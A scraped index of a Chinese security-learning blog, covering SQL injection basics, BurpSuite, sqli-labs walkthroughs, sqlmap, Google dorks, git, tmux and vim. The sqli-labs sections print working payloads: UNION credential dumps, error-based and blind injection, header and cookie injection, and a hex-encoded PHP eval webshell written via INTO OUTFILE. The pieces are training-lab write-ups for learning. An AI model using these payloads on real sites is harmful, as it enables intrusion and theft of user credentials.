究竟SQL注入，是做什么的呢？它危险，究竟危险在什么地方呢？ SQL注入的过程，是利用来源于用户的参数填充到SQL语句中，从而恶意使得SQL的 语句结构 发生变化，从而获得信息的过程。 最典型的select...from...where password='$password'，用户恶意提供1'or true # , 从而最终语句为select...from...where password='1'or true # '。这样的话就能够在不知道 密码的情况下登录成功，这不是很危险？ 既然可以像以上一样，改变SQL语句结构，为什么不能更恶意一些，构造一些语句，获取我们关心的 信息呢？ 比如select...from...where id='1' and false union select 1, version(), database() # '， 不就可以获得敏感信息了吗？ 那么可不可以更恶意一些呢？ 当服务器的数据库设置不当时，我们可以将查询输出至文件。 正常使用当然是输出查询到的记录，可是当我们输出恶意文件时，不就可以获取webshell了吗？ 因此or 1=1并不是我们的最终目的，最终目的是 信息 或者 控制权 。 获取数据库名 select+group_concat(schema_name)+from+information_schema.schemata 获取数据表名 select+group_concat(table_name)+from+information_schema.tables+where table_schema='dbName' 获取列名 select+group_concat(column_name)+from+information_schema.columns+where table_name='tableName' 库 表 字段 说明 information_schema schemata schema_name 数据库名 information_schema tables table_schema 数据库名 information_schema tables table_name 数据表名 information_schema columns table_name 数据表名 information_schema columns column_name 字段名 常见URLencode字符 char URLencode 空格 %20 # %23 ‘ %27 = %3d","link":"/something-about-SQL-Injection-skills/"},{"title":"something about burpsuite","text":"BurpSuiteBurpSuite 介绍 Burp suite 维基百科 Burp suite 官网 Burpsuite 是由JAVA语言编写 Burpsuite 在测试时需要手动配置某些参数以触发对应的行为来完成测试 工作原理自己理解的 BurpSuite 工作原理: 正确设置 BurpSuite 截断后，浏览器发送请求;请求被 BurpSuite 拦截，此时可以分析 拦截下的 http 请求,分析注入点。当 BurpSuite 放行请求后，请求被发送给目标服务器。 服务器返回对应的响应至 BurpSuite , BurpSuite 将对应响应交还至浏览器。 BurpSuite 可以: 重复发送拦截下的请求 可以更改请求内容后，发送请求 基于此，可以对关心的内容设置注入点，使用合适字典，从而达到暴力破解的目的。 BurpSuite 模块 Proxy 模块 Intercept Intercept is on/off 用于设置截断HTTP请求 开/关 Forward 放行HTTP请求 Drop 丢弃此次拦截的请求 Action 将截断的请求发送到其它模块 Spider 模块 Engagement tools-Discover content 爬虫模块(Pro Only) HTTP history 提交过的请求历史记录(支持Filter) Options 配置选项 Proxy Listeners 代理监听设置 设置监听端口 Intercept Client Requests 截断客户端请求 设置截断规则,优先级由上至下 Intercept Server Responses 截断服务器响应 筛选符合条件的HTTP响应,优先级由上至下 Intercept WebSockets Messages 截断WebSocket通信 Response Modification 服务端响应修改 Unhide hidden form fields 将隐藏的表单元素显示化 Enable disabled form fields 将disabled表单元素enable化 Remove input field length limits 移除输入框长度限制 Remove JavaScript form validation 移除JS表单验证 Remove all JavaScript 绕过文件上传中的JS验证 搭配 Repeater 模块使用 Convert HTTPS links to HTTP 将HTTPS链接转换为HTTP Match and Replace 匹配与替换HTTP消息内容 配置替换HTTP请求头等，用以伪装客户端等 TLS Pass Through 配置TLS(SSL)等直连 Miscellaneous 其它配置 Use HTTP/1.0 in requests to server 配置使用HTTP/1.0协议给服务器发送请求 Set response header “Connection: close” 配置响应头 “Connection: close” Suppress Burp error messages in browser 设置不再将Burp的错误消息发送至浏览器 Target 模块 Scope 作用域 可以对拦截设置更细的粒度 可以设置拦截白名单 可以设置拦截指定文件 Site map 站点地图 左侧为访问的URL 右击Menu Engagement tools-Analyze Target 分析站点(Pro Only) Spider 模块 Engagement tools-Discover content 爬虫模块(Pro Only) Compare site map 站点地图比较,比较登录与不登录响应是否不同 右侧为URL详细 支持Filter Intruder 模块 标识符枚举 (注入点字典枚举) Attack type: Sniper 狙击枪模式，精准模式，只针对一个位置进行测试 Battering ram 攻城锤模式，针对多个位置使用同一个Payload Pitchfork 单叉模式，针对多个位置使用不同Payload Cluster bomb 激素炮模式，针对多个位置，全部组合 提取有用数据 模糊测试 Options Grep - Extract 从Response中获取内容，如不断变化的Token Redirections 配置重定向 Repeater 模块 用于多次重放请求和手工修改请求消息后对服务器端响应进行分析的模块。 Sequencer 模块 用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否可预测，密码重置 是否可预测等场景。 Decoder 模块 用于对字符串进行加密操作。 Comparer 模块 用于对两个不同的HTTP请求进行比较。 BurpSuite 配置 设置代理 使用 SwitchyOmega 设置模式，针对测试主机使用burpsuite代理，其他主机(CDN等)正常访问 设置CA证书 使用系统管理员权限打开浏览器 访问 http://burp/ (burpsuite代理) 在页面下载CA证书 将下载的CA证书导入浏览器 BurpSuite 截断WebApp 设置 BurpSuite 主机和测试移动设备在同一网段下 设置移动设备代理，代理服务器为 BurpSuite 主机 BurpSuite 目录扫描利用BurpSuite的Intruder模块进行不断枚举，然后对HTTP状态码进行筛选。 即以GET方式枚举URL路径。 BurpSuite 高级使用 针对token检测测试 brute force(#High)","link":"/something-about-burpsuite/"},{"title":"something about git","text":"Git-Flow不同分支 ， 各司其职 。 分支类型 命名规范 创建自 合并至 说明 main main - - 部署版本分支 develop develop - - 代码集成分支 feature feature/* develop develop 新功能分支 release release/* develop develop和master 新版本发布 hotfix hotfix/* master develop和master 生产环境中发现的紧急bug的修复 git command 分支(branch) 使用 checkout 创建分支 12# 基于main分支创建develop分支git checkout -b develop main 使用 switch 创建分支 12# 基于当前分支创建feature/switch分支git switch -c feature/switch 使用 switch 切换分支 12# 切换到feature/switch分支git switch feature/switch 合并分支(merge) 1234# 合并feature/switch分支到当前分支(develop)git switch develop# --no-ff =&gt; no-fast-forwardgit merge --no-ff feature/switch 暂存区(stage) 将内容添加至暂存区 1234# 添加当前目录下所有文件更改:git add .# 添加file文件更改:git add file 将文件的部分内容添加至暂存区 1234567# 对于已经暂存的文件, 开启交互模式后选择需要暂存的hunkgit add -p &lt;filename&gt;# ####################### 对于未暂存的文件 先将文件添加至暂存区，但是文件内容不暂存git add -N &lt;filename&gt;# 然后再开启交互模式选择需要暂存的hunkgit add -p &lt;filename&gt; 误添加至暂存区的内容 取消添加 将 add 进暂存区的内容(还未提交),取消 add,但是本地文件内容不做删除。 1234# 将 filename.txt 文件取消 `add`git reset HEAD -filename.txt# 将当前目录下所有已添加文件，取消`add`git reset HEAD . 提交(commit) 将暂存区内容做一次提交 提交至本地仓库，正式纳入版本记录。 一次提交，看作一次版本的 原子 操作。 123git commit# 随之而来的vim提交窗口中补充commit的对应message。# message保持Angular规范 Angular规范保持 &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt; 格式 具体要求如下: 主要type feat: 增加新功能 fix: 修复bug 特殊type docs: 只改动了文档相关的内容 style: 不影响代码含义的改动，例如去掉空格、改变缩进、增删分号 build: 构造工具的或者外部依赖的改动，例如webpack，npm refactor: 代码重构时使用 revert: 执行git revert打印的message 暂不使用type test: 添加测试或者修改现有测试 perf: 提高性能的改动 ci: 与CI（持续集成服务）有关的改动 chore: 不修改src或者test的其余修改，例如构建过程或辅助工具的变动 修改最后一次提交 发现提交错了:少提交文件、comment写错了时都可以使用git commit命令的--amend参数。 修改comment 123git commit --amend -m &quot;new comment&quot;# 或进入vim中编辑`comment`git commit --amend 补充漏提交文件 1234# 将文件添加至暂存区git add file# 附加提交git commit --amend 删除多提交文件时，git rm file将文件从暂存区中移除，其它相同。 修改提交时不修改comment 12# 多使用`--no-edit`参数,将以不修改`comment`的方式修改上次的提交内容git commit --amend --no-edit 备份(stash) 备份当前工作区内容 将当前工作区内容保存到Git栈中，工作区回到最近提交状态。 1git stash 从Git栈中恢复最近一次保存的内容 1git stash pop 清空Git栈 1git stash clear 子模块(submodule) 添加子模块 可以将不同仓库的模块添加至本模块中。 12# git submodule add &lt;url&gt; &lt;path&gt;git submodule add git@github.com:username/otherModule.git ~/localModule/otherModule 子模块内容获取 克隆包含子模块的项目时，子模块信息会克隆下来，但其包含的项目文件未克隆。 12345678# 使用 init 进行 子模块初始化git submodule init# 使用 update 进行 子模块获取git submodule update# 使用 --recursive 参数,获取子模块及包含的&quot;子...子&quot;模块git submodule update --recursive# 使用 --remote 参数获取子模块最新版本到本地仓库中git submodule update --remote 子模块删除 不需要子模块时，删除相应子模块。 12345678910# 1. 删除本地仓库中子模块目录rm -rf path/to/remoteModule# 2. 删除.gitmodules中相关内容vim .gitmodules# 3. 删除 .git/config 文件中相关内容vim .git/config# 4. 删除子模块的追踪块rm -rf .git/module/remoteModule# 5. 删除子模块缓冲区git rm --cached remoteModule git add -p 参数 选项 说明 y 暂存当前块 n 不暂存当前块 a 暂存当前块及剩余块 d 不暂存当前块及剩余块 g 选择并跳转至指定的块 / 正则搜索指定的块 j 离开当前未定块，处理下一个 未定 块 J 离开当前未定块，处理下一个块 k 离开当前未定块，处理上一个 未定 块 K 离开当前未定块，处理上一个块 s 将当前块分为更小的块 e 手动编辑当前块 ? help something about github 更改github邮箱导致贡献丢失 克隆目标仓库 12git clone git@github.com:username/target.gitcd target/ 制作脚本文件 1touch run.sh 将以下内容添加至 run.sh 中 12345678910111213141516171819202122#!/bin/sh# OLD_EMAIL 为旧邮箱# CORRECT_NAME 为用户名# CORRECT_EMAIL 为新邮箱git filter-branch --env-filter 'OLD_EMAIL=&quot;old_mail@xxx.com&quot;CORRECT_NAME=&quot;correctName&quot;CORRECT_EMAIL=&quot;new_mail@xxx.com&quot;if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]then export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot; export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;fiif [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]then export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot; export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;fi' --tag-name-filter cat -- --branches --tags 在仓库中运行 run.sh 123# 添加执行权限chmod u+x ./run.shbash ./run.sh 检查git log 中对应邮箱是否更改 1git log 提交至远端1git push --force --tags origin 'refs/heads/*'","link":"/something-about-git/"},{"title":"something about hexo","text":"hexo command 创建新的一篇博客(“blog-name-is-test”) 12345# create blog# 命令可以指定布局:# hexo new draft &quot;it is a draft&quot;hexo new &quot;blog name is test&quot;# 命令生成物为:source/_posts/blog-name-is-test.md 创建新的一篇博客草稿(“draft-blog”) 12345hexo new draft &quot;draft-blog&quot;# 将草稿发布 实际上 只是从 source\\_drafts\\ 移动至 source\\_posts\\ 下hexo publish draft-blog# 简写 Phexo P draft-blog clean已经生成网站 12#清除缓存文件(db.json)和静态文件hexo clean generate网站 1234# generate网站#命令简写为:# hexo ghexo generate 开启hexo web服务 12345# start server# 命令简写为:# hexo shexo server# 成功后访问 http://localhost:4000/ 部署托管 1234# deploy to github etc.# 命令简写:# hexo dhexo deploy clean and generate and server 1234hexo clean ; hexo g ; hexo s# deployhexo clean ; hexo g ; hexo d 博客常用 站内链接 12&lt;!-- 相当于 &lt;a href=&quot;文章标题&quot;&gt;显示内容&lt;/a&gt; --&gt;{% post_link 文章标题 显示内容 %}","link":"/something-about-hexo/"},{"title":"something about penetration testing","text":"penetration test这就是渗透测试啊。 渗透测试阶段 明确需求 明确客户 测试目的 ， 测试的深入程度 ， 既定条件(即项目范围) 等信息。 信息收集 开源情报分析 分析各种公开信息。利用端口扫描工具等各种工具，初步了解内外或外网运行的 系统，系统上安装了什么软件。 威胁建模 以攻击人员的角度出发，根据所获信息拟定各种破坏方案。 漏洞分析 使用漏洞扫描程序，借助程序的漏洞数据库和主动检测技术，推测目标上存在哪些漏 洞。结合人工分析，亲自确认扫描程序找到的全部漏洞。 漏洞验证 利用Metasploit一类的安全工具，利用发现的安全漏洞，获取客户系统的访问权限。 深度攻击 以被突破的系统为着手点，收集各种信息，搜索有价值的文件，在必要的时候提升自 己的权限。 书面汇报 将发现的各种问题整理为易于客户理解的书面文档。 文档应当明确哪些安全措施 切实有效，指出客户需要改进的不足之处，同时还要描述测试人员突破防线的手段， 获取到的信息，并且提供修复问题的建议等内容。","link":"/something-about-penetration-testing/"},{"title":"something about search skills","text":"搜索引擎使用技巧Google语法 精确关键词 使用&quot;将关键词包裹起来，可以达到精确搜索的目的。如&quot;abc def&quot;为精确包含abc def 内容的站点，仅包含abc是不会匹配的。 排除内容 使用-xxx可以排除包含xxx的内容。 逻辑或 使用abc OR def，可以搜索包含abc或者包含def的内容。 通配符 使用*可以通配内容,达到模糊检索的目的，如*与莫蒂。 intitle: 使用intitle:xxx可以匹配标题关键字xxx。 inurl: inurl:xxx搜索url中存在xxx内容的站点。 如：inurl:php?id=1 intext: 使用intext:xxx可以检索主体包含xxx的内容。 related: 使用related:xxx可以检索与xxx相关联的站点内容。 filetype:xxx 检索文件后缀名为xxx的内容。 site: site:xxx.yyy,搜索xxx.yyy站点内的内容。如site:xxx.yyy 搜索引擎使用技巧。 可以搭配其它技巧使用。 查找后台地址 site:xxx.yyy 管理后台/登陆/管理员/系统 site:xxx.yyy inurl:login/admin/system/guanli/denglu 敏感文件 site:xxx.yyy filetype:pdf/doc/xls/conf site:xxx.yyy filetype:log/sql/conf 上传漏洞 site:xxx.yyy inurl:file site:xxx.yyy inurl:load 邮箱/QQ/群 site:xxx.yyy 邮件/email site:xxx.yyy qq/QQ/群/企鹅/腾讯 Google语法 in:name 使用in:name xxx，可以检索仓库 标题 中含有xxx的内容。 in:description 使用in:description xxx，可以检索仓库 描述 中含有xxx的内容。 in:readme 使用in:readme xxx，可以检索仓库 README 中含有xxx的内容。 forks: stars: 使用stars:&gt;3000 xxx，可以检索star数量大于3000,包含xxx的内容。 forks:min..max stars:min..max 使用stars:1000..3000 xxx，可以检索star数量在1000至3000之间,包含xxx的内容。 size: 使用size:&gt;=5000 xxx，可以检索仓库大小在5000kb之上，包含xxx的内容。 pushed: 使用pushed:&gt;2021-12-26 xxx，可以检索推送时间大于2021/12/26，包含xxx的内容。 created: 使用created:&gt;2021-12-26 xxx，可以检索仓库创建时间大于2021/12/26，包含xxx的内容。 user: 使用user:xxx检索 用户名 为xxx的内容。 license: 使用license:apache-2.0 xxx，可以检索开源协议为apache-2.0，包含xxx的内容。 language: 使用language:python xxx，可以检索 开发语言 为python，包含xxx的内容。","link":"/something-about-search-skills/"},{"title":"something about sqliLabs 0x01","text":"sqli-labssqli-labs =&gt; 备份地址 Page-1(Basic Challenges)Less-1 Get - Error based - Single quotes - String $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 注入点是id，正常url为http://train.com/Less-1/?id=1。 注入id=10'or+true，会有报错信息(多余')，重新注入id=10'or+true%23，%23为#, 注释掉尾部的剩余sql语句。 确认显示列 注入?id=1'+and+false+union+select+1,2,3+--+，页面上显示2,3，因此显示列为第2列与第3列。 获取敏感信息 利用获取的显示列，构造sql，将敏感信息放置在第2列与第3列中显示在页面上。 注入?id=1'+and+false+union+select+1,version(),database()+--+，可以获得数据库版本号 与数据库名。 获取数据库名 注入?id=1'+and+false+union+select+1,(select+group_concat(schema_name)+from+information_schema.schemata),database()+--+， 可以获得当前数据库用户 所有数据库 (从information_schema库的schemata表中拼接schema_name获得)。 获取数据表名 获取库名的状态下，可以根据目标库名，获取表名。 ?id=1'+and+false+union+select+1,(select+group_concat(table_name)+from+information_schema.tables+where table_schema='security'),database()+--+， 可以获得目标数据库的所有表名(从information_schema库的tables表中拼接table_name获得)。 获取列名 获取表名的状态下，可以根据目标表名，获取对应的字段名。 ?id=1'+and+false+union+select+1,(select+group_concat(column_name)+from+information_schema.columns+where table_name='users'),database()+--+， 可以获得目标表的所有字段名(从information_schema库的columns表中拼接column_name获得)。 获取关心信息 获取字段名后，还有什么是获取不到的呢？ ?id=1'+and+false+union+select+1,(select+group_concat(username)+from+security.users),(select+group_concat(password)+from+security.users)+--+， 可以获得所有用户的用户名及其对应的密码。 Less-2 Get - Error based - Integer based $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 与Less-1相同 Less-3 Get - Error based - Single quotes with twist - String $sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;; 相比Less-1，还需要闭合括号()，其它与Less-1相同。 Less-4 Get - Error based - Double quotes - String $id = '&quot;' . $id . '&quot;'; $sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;; 此次以&quot;(双引号)包裹参数，因此尝试闭合&quot;。 实际上当尝试注入id=1'+and+false+--+，却返回结果时，就应该考虑更换闭合方式。 成功闭合后，即与Less-1相同。 Less-5 Get - Double Injection - Single quotes - String $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; 实际尝试后，注入?id=1'+and+false+--+与?id=1'+or+true+--+页面反应不同样，即标志着确实有注入点。 只是，页面没有显示信息，如何获取信息呢？ 并非没有办法。此处sql语句错误时，会输出错误信息，因此恶意构造sql语句，将关心信息藏在 报错输出中。 Duplicate entry 123456789101112131415and( select 1 -- 检索y的值(1) from ( -- 括号必需 select count(*) ,concat( -- 利用 concat函数拼接内容,起别名为x 0x23 -- 拼接#符号,分隔信息 ,($PAYLOAD) -- payload ,0x23 ,floor(rand(0)*2) -- floor函数与count(*)，group by,结合使用来报错 ) as x from information_schema.tables group by x -- floor产生的0/1序列，group by 时会报错 ) as y) 使用公式and+(+select+1+from+(+select+count(*)+,concat(0x23,($PAYLOAD),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+, 构造payload，?id=100'+and+(+select+1+from+(+select+count(*)+,concat(0x23,(select+database()),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+。 updatexml报错 1234567and( -- 括号必需 updatexml(1 ,concat($PAYLOAD -- ~(0x7e)是非法字符，一定会报错 ,0x7e) ,1)) updatexml(XML_document, XPath_string, new_value)，当XPath_string格式出现错误时，mysql会报语法错误。 使用公式，and+(updatexml(1,cancat(database(),0x7e),1))+--+, 构造payload，?id=99'+and+(updatexml(1,cancat(database(),0x7e),1))+--+。 extractvalue报错 1234567and( -- 括号必需 extractvalue(1, cancat($PAYLOAD ,0x7e) )) extractvalue(XML_document, XPath_string),与updatexml()函数相同，当XPath_string格式出现错误时，mysql会报语法错误。 使用公式and+(extractvalue(1,cancat($PAYLOAD,0x7e)))+--+,构造payload，?id=99'+and+(extractvalue(1,cancat(database(),0x7e)))+--+。","link":"/something-about-sqliLabs-0x01/"},{"title":"something about sqliLabs 0x02","text":"sqli-labssqli-labs =&gt; 备份地址 Page-1(Basic Challenges)Less-6 Get - Double Injection - Double Quotes - String 大致与Less-5相同，不同之处为闭合符号为双引号(&quot;)。 Less-7 Get - Dump into outfile - String 构造输出文件，输出webshell， ?id=1'))+and+false+union+select+null,0x3c3f706870206576616c28245f4745545b27636d64275d29203f3e,null+from+dual+into+outfile+'C:\\\\wwwroot\\\\sqliLabs\\\\Less-4'+--+。 此种漏洞条件比较苛刻，需要mysql配置可以写入文件,需要知道绝对路径等等。 其中0x3c3f706870206576616c28245f4745545b27636d64275d29203f3e是&lt;?php eval($_GET['cmd'])?&gt;的hex编码形式。 关于hex编码可以使用vim组件的xxd。 Less-8 GET - Blind - Boolean Based - Single Quotes 基于布尔的盲注,注入后，页面不会显示对应内容。 注入?id=1'+and+false+--+与?id=1'+or+true+--+，发现页面响应内容不同,因此可以确认注入点。 确认注入点后，通过?id=1'+and+(length(database())+&lt;+20)+--+获得数据库长度， 通过?id=1'+and+(ascii(substr(database(),1,1))&gt;ascii('m'))+--+等可以确定数据库的名字。 通过?id=1'+and+(length((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1))+&lt;+20)+--+等 获得数据表的长度,id=1'+and+(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))+&lt;+ascii('m'))+--+等 确定数据表的名字。 Less-9 GET - Blind - Time Based - Single Quotes 基于时间的盲注，注入后，页面不会显示对应内容。 注入?id=1'+or+true+--+与?id=1'+and+sleep(5)+--+，发现页面响应时间明显不同，因此可以确认注入点。 通过与Less-8相似的注入技巧,可以获取敏感信息。 例: ?id=1'+and+(ascii(substr(database(),1,1))&lt;ascii('m'))+and+sleep(5)+--+ Less-10 GET - Blind - Time Based - Double Quotes 通过?id=1'+and+sleep(5)+--+与?id=1&quot;+and+sleep(5)+--+页面响应时间明显不同，可以确定闭合方式为&quot;， 其它与Less-9相同。","link":"/something-about-sqliLabs-0x02/"},{"title":"something about sqliLabs 0x03","text":"sqli-labssqli-labs =&gt; 备份地址 Page-1(Basic Challenges)Less-11 POST - Error Based - Single quotes - String 提交方式为POST方式，直接构造post请求。 uname=username&amp;passwd=password'+or+true+--+&amp;submit=Submit或 uname=username&amp;passwd=password'+or+true+--+&amp;submit=Submit都可，两处都可注入。 Less-12 POST - Error Based - Double quotes - String - with twist 多试几次，发现闭合方式不同，双引号与括号闭合(&quot;$id&quot;)。 uname=username&quot;)+or+true+--+&amp;passwd=password&amp;submit=Submit或 uname=username&amp;passwd=password&quot;)+or+true+--+&amp;submit=Submit都可，两处都可注入。 Less-13 POST - Double Injection - Single quotes - String - with twist 闭合方式为('$password')。 uname=username')+or+true+--+&amp;passwd=password&amp;submit=Submit或 uname=username&amp;passwd=password')+or+true+--+&amp;submit=Submit两处都可注入。 Less-14 POST - Double Injection - Double quotes - String - with twist 闭合方式为&quot;$password&quot;。 uname=username&quot;+or+true+--+&amp;passwd=password&amp;submit=Submit或 uname=username&amp;passwd=password&quot;+or+true+--+&amp;submit=Submit两处都可注入。 Less-15 POST - Blind - Boolean/Time Based - Single quotes uname=username'+or+true+--+&amp;passwd=password&amp;submit=Submit或 uname=username&amp;passwd=password'+or+true+--+&amp;submit=Submit两处都可注入。 Less-16 POST - Blind - Boolean/Time Based - Double quotes uname=username&quot;)+or+true+--+&amp;passwd=password&amp;submit=Submit或 uname=username&amp;passwd=password&quot;)+or+true+--+&amp;submit=Submit都可以注入。 Less-17 POST - Update Query - Error Based - String 这不是普通的select语句，而是update语句，可以利用0x01中学到的updatexml(),extractvalue()报错来获取信息。 uname=Dumb&amp;passwd=newpassword'+or+updatexml(1,concat(0x7e,database()),1)+or+'close&amp;submit=Submit即可成功注入，并获得了database()信息。 Less-18 POST - Header Injection - Uagent field - Error based 需要注入HTTP头，由于这次查询，先查询用户/密码是否存在，如果存在，将其 User-Agent 存入数据库中。 注入HTTP头的User-Agent属性。 1234567POST /Less-18/ HTTP/1.1Host: train.comUser-Agent: test' or updatexml(1,concat(0x7e, database()) ,1) or 'close...Upgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit Less-19 POST - Header Injection - Referer field - Error based 注入HTTP头的Referer属性，此属性是用来标识，请求来源于哪个URL。 12345678910POST /Less-19/ HTTP/1.1...User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3...Referer: close' or updatexml(1,concat(0x7e, database()) ,1) or 'close...uname=admin&amp;passwd=admin&amp;submit=Submit Less-20 POST - Cookie Injections - Uagent field - Error based 对HTTP头的Cookie属性进行注入。 1234567POST /Less-20/ HTTP/1.1Host: train.com...Cookie: uname=admin' or updatexml(1, concat(0x7e, database()),1) or 'close; ZDEDebuggerPresent=php,phtml,php3Upgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit 跟隨redirection，即可以看到结果。 Less-21 POST - Cookie Injections - Uagent field - Error based 与 Less-20 相同，但是观察到uname = YWRtaW4=中是有=存在的，联想到 BASE64编码后，会出现=补足编码。 使用base64工具解码查看： 12~$ echo &quot;YWRtaW4=&quot; | base64 -d -admin 与请求内容吻合，因此构造好payload后还需要进行BASE64编码。 构造payload为admin' or updatexml(1, concat(0x7e, database()),1) or 'close。 使用base64工具编码: 12~$ echo &quot;admin' or updatexml(1, concat(0x7e, database()),1) or 'close&quot; | base64 -YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSksMSkgb3IgJ2Nsb3NlCg== 最终payload为: 1234GET /Less-21/index.php HTTP/1.1...Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSksMSkgb3IgJ2Nsb3NlCg%3d%3d; ZDEDebuggerPresent=php,phtml,php3Upgrade-Insecure-Requests: 1 Less-22 POST - Cookie Injections - Uagent field - Error based 与 Less-21 相比，闭合方式为&quot;，其他相同。","link":"/something-about-sqliLabs-0x03/"},{"title":"something about sqlmap","text":"sqlmap参数 sqlmap版本:[1.5.11#stable] 参数 含义 备注 -r 从文件中加载http请求 -r ~/target.txt –level 设置探测级别(1-5),1最低 –level=5 远端服务器性能增加 –risk 设置风险级别(1-3),1最低 –risk=3 视情况酌情增加 -p 指定注入点 -p id –dbs 指定探测数据库结构 –second-url 指定结果渲染页面url –second-url=”http://target/url/&quot; –batch 指定自动模式，需要手动确定的地方，全部使用默认选项 参数说明–second-url请求提交页面与结果渲染页面分离，sqlmap无法获得注入结果。因此使用--second-url=xxx参数配置结果渲染页面url。","link":"/something-about-sqlmap/"},{"title":"something about tmux","text":"tmux 会话tmux默认先导快捷键(PREFIX)为&lt;C-b&gt;。 创建会话 1234# 创建无名会话tmux# 创建名为 name 的会话tmux new -s name 断开会话 123# 断开当前会话，会话在后台运行tmux detach# 快捷键 PREFIX-d 列出所有现存会话 1234# 列出所有会话tmux list-session# 简化命令tmux ls 重连会话 123456# 重连名为 name 的会话tmux attach-session -t name# 简写 atmux a -t name# 默认重边第一个会话tmux a 关闭会话 1234# 关闭名为 name 的会话tmux kill-session -t name# 关闭所有的会话tmux kill-server 切换会话 12# 先导快捷键松开后，再按`s`，进入会话选择画面，按`序号`进入对应会话;或`方向键`选择会话;PREFIX-s 配置文件 1~/.tmux.conf tmux 窗口 创建新窗口 12# 先导快捷键松开后，再按`c`，创建新的窗口PREFIX-c 切换窗口 123456# 先导快捷键松开后，再按`n`,切换至下个窗口PREFIX-n# `p`,切换至上个窗口PREFIX-p# 先导快捷键松开后，再按`w`，进入窗口选择画面，按`序号`进入对应窗口，或`方向键`选择PREFIX-w tmux 面板分屏: 一个窗口可以分割为多个面板(panel)。 竖直分屏 12# 先导快捷键松开后，再按`&quot;`，以竖直线分割窗口PREFIX-&quot; 水平分屏 12# 先导快捷键松开后，再按`%`,以水平线分割窗口PREFIX-%","link":"/something-about-tmux/"},{"title":"something about vim","text":"tricks 移动选中文本 1vnoremap J :m '&gt;+1&lt;CR&gt;gv=gv 1vnoremap K :m '&lt;-2&lt;CR&gt;gv=gv 使用正则排序 1:sort r /reg/ 将外部命令的输出读入缓冲区 1:r !cmd 将缓冲区内容作为外部命令输入 1:w !cmd 运行选中代码 1:'&lt;,'&gt;!python 将当前文件转换为html文件 1:%TOhtml 统计文件字节数,支持visual模式 1g&lt;C-g&gt; 在insert模式下删除行首方向一个单词 1&lt;C-w&gt; 在insert模式下删除到行首 1&lt;C-u&gt; 在insert模式中重复上一行内容 / 下一行内容 1&lt;C-y&gt; / &lt;C-e&gt; 在insert模式下执行一个normal命令 1&lt;C-o&gt;{cmd} 底部命令行中输入当前光标单词 1&lt;C-r&gt;&lt;C-w&gt; 底部命令行中输入当前光标所在行内容 1&lt;C-r&gt;&lt;C-a&gt; shell中挂起vim任务 1&lt;C-z&gt; shell中查看挂起的任务 1jobs shell中返回挂起的vim 任务 1fg [n] 向文件尾方向移动30行 / 向文件头方向移动30行 130+ / 30- 跳转至上次关闭文件时，normal模式下光标所在行 1'&quot; 跳转至上次关闭文件时，insert模式下光标所在行 1'^ insert模式中，重复上次insert模式中所作的所有操作 1&lt;C-a&gt; 逆转文档内容 1:g/^/m0 调试配置项 12# help :verbose:verbose set background 正则 环视 顺序肯定环视 very magic模式公式 \\vXYZ%(regexp)@= 1234# magic 模式 匹配后面是`world`的`hello`/hello\\%\\(world\\)\\@=# very magic 模式 匹配后面是`world`的`hello`/\\vhello%(world)@= 顺序否定环视 very magic模式公式 \\vXYZ%(regexp)@! 1234# magic 模式 匹配后面不是`world`的`hello`/hello\\%\\(world\\)\\@!# very magic 模式匹配后面不是`world`的`hello`/\\vhello%(world)@! 逆序肯定环视 very magic模式公式 \\v%(regexp)@&lt;=XYZ 1234# magic 模式 匹配前面是`hello`的`world`/\\%\\(hello\\)\\@&lt;=world# very magic 模式 匹配前面是`hello`的`world`/\\v%(hello)@&lt;=world 逆序否定环视 very magic模式公式 \\v%(regexp)@&lt;!XYZ 1234# magic 模式 匹配前面不是`hello`的`world`/\\%\\(hello\\)\\@&lt;!world# very magic 模式 匹配前面不是`hello`的`world`/\\v%(hello)@&lt;!world 标记匹配起始/结束 \\zs,\\ze 1/\\vhello\\zsworld\\ze 窗口管理 移动当前窗口位置 1234567&quot; 将当前窗口移动到左边&lt;C-w&gt;H&quot; 下/上/右&lt;C-w&gt;J&lt;C-w&gt;K&lt;C-w&gt;L 进入指定窗口 12345&quot; 进入最顶部窗口&lt;C-w&gt;t&quot; 进入最底部窗口&lt;C-w&gt;b 旋转窗口 12345&quot; 第一个窗口 -&gt; 第二个 -&gt; 第三个 -&gt; ... -&gt; 第一个&lt;C-w&gt;r&quot; 第一个窗口 -&gt; 第n个窗口 -&gt; 第n-1个 -&gt; ... -&gt; 第一个&lt;C-w&gt;R 将轮转文件拆分到另一个窗口 1&lt;C-w&gt;^ 创建一个新窗口，编辑新文件 1&lt;C-w&gt;n diff模式 指定两个文件diff 在拆分的两个窗口中分别使用:diffthis，指定对两个窗口中的文件进行diff。 1:diffthis 指定当前buff文件与某个新文件diff 1:diffsplit /path/to/newfile 关闭diff模式 1:diffoff 冲突间移动 1234&quot; 